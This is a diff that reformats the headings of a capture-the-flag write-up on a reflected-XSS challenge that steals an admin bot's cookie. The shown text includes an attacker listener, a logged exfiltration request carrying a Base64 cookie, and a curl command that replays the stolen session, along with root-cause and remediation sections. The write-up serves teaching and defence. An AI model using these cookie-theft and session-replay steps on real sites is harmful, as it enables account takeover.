@@ -24,7 +24,7 @@ Start the vulnerable server:
 Start the attacker's HTTP server:
 python3 -m http.server 1337 > server.log 2>&1 &
 
-2. Craft the Payload (index.html)
+### 2. Craft the Payload (index.html)
 
 Create index.html in the directory served by the attacker's server. The script dynamically builds an XSS payload, encodes it, and redirects the bot to the vulnerable endpoint.
 
@@ -48,11 +48,11 @@ Create index.html in the directory served by the attacker's server. The script d
 </html>
 ```
 
-3. Trigger the Bot
+### 3. Trigger the Bot
 
 Submit the URL http://hacker.localhost:1337 to the admin bot (via the challenge interface).
 
-4. Capture the Cookie
+### 4. Capture the Cookie
 
 The bot visits the page, gets redirected to the vulnerable endpoint, and the reflected XSS executes. The bot's cookie is sent to the attacker's server via a GET request. Check server.log:
 
@@ -62,7 +62,7 @@ cat server.log
 You will see a line like:
 127.0.0.1 - - [29/Oct/2026 08:42:05] "GET /?c=YXV0aD1hZG1pbnwuUVg1a3pNend5TXdFRE4yRXpXfQ== HTTP/1.1" 200 -
 
-5. Decode the Cookie
+### 5. Decode the Cookie
 
 Decode the Base64 string:
 
@@ -73,13 +73,13 @@ Result:
 
 auth=admin|.QX5kzMzwyMwEDN2EzW}
 
-6. Log In as Admin and Get the Flag
+### 6. Log In as Admin and Get the Flag
 
 Use the stolen cookie to access the main page and extract the flag:
 
 curl -L -b "auth=admin|.QX5kzMzwyMwEDN2EzW}" http://challenge.localhost/ | grep -o "pwn.college{[^}]*}"
 
-Root Cause
+## Root Cause
 
 The vulnerability is a combination of three flaws:
 
@@ -94,7 +94,7 @@ The vulnerability is a combination of three flaws:
 Insecure Cookie Storage: The auth cookie stores the username and password in plaintext (username|password), and it is not marked as HttpOnly. This allows JavaScript to read and exfiltrate it.
 
 
-Remediation
+## Remediation
 
     Escape Output: Use markupsafe.escape to sanitize the msg parameter.
 
@@ -116,7 +116,7 @@ The message: {escape(flask.request.args.get("msg", "(none)"))}
 
         Set the SameSite attribute to Strict or Lax.
 
-Lessons Learned
+## Lessons Learned
 
     XSS is not just about alert(): It can be used to steal credentials and escalate privileges.
 
@@ -126,12 +126,12 @@ Lessons Learned
 
     URL encoding is tricky: The + character in URLs decodes to a space. Always encode it as %2B when building payloads.
 
-References
+## References
 
 - [OWASP: Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
 - [OWASP: Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)
 - [PortSwigger: Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
-This response is AI-generated, for reference only.
+
 
 
 
